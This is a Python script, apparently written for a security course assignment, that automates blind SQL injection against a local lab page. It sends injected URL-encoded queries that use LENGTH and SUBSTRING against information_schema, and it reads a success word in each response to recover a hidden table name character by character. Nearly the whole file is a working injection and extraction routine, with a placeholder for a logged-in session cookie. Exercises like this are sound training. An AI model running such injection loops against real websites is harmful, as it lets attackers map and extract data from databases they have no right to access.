# I wrote this script for the blind sqli questions, so I don't have to try a huge amount of different url
# addresses manually. It helped me a lot and made the assignment feasible. Trying so many different addresses
# manually is exhausting and I will probably lose count.

import requests

# In this function I will find the length of the name of the secret table by iteratively asking the server whether the
# length is 1, 2, etc. We do this by using the information schema table
def find_length(my_cookies):

    # Assuming the name is probably less than 20 characters long. If not, we will try with larger i
    for i in range(1, 50):
        url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20LENGTH((SELECT%20table_name%20FROM%"
               f"20information_schema.tables%20WHERE%20table_schema=%27secure%27%20LIMIT%201))={i};--%20")

        # Getting the response
        response = requests.get(url, cookies = my_cookies)

        # If wonderland is in the text that means that the site has loaded successfully
        if "wonderland" in response.text:
            return i

    # The length is more than 20 characters
    return -1

# This function receives the length of the table and finds the name of it by trying out all the possible options in a
# blind sqli manner.
def find_name(my_cookies, length):

    # Because I assume that the name of the table is encrypted through md5, I am only going to try lowercase english
    # letters and numbers.
    # If I will be mistaken, I will change that.

    charset = "abcdefghijklmnopqrstuvwxyz0123456789"

    result = ""

    # We want the loop to iterate over the entire string including the last character
    for position in range(1, length + 1):
        found = False
        for char in charset:
            url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20SUBSTRING((SELECT%20table_name%20FROM%"
                   f"20information_schema.tables%20WHERE%20table_schema=%27secure%27%20LIMIT%201),{position},1)"
                   f"=%27{char}%27;--%20")

            response = requests.get(url, cookies = my_cookies)

            if "wonderland" in response.text:
                print(f"The char in position {position} is {char}")
                result += char
                found = True
                break

        if not found:
            print("OH NO THIS IS NOT MD5!")
            exit(1)

    return result

def main():

    # The cookie in order to log in as alice
    my_cookies = {"PHPSESSID": "INSERT_YOUR_COOKIE_HERE"}

    length = find_length(my_cookies)
    print(length)

    print(find_name(my_cookies, length))

if __name__ == "__main__":
    main()
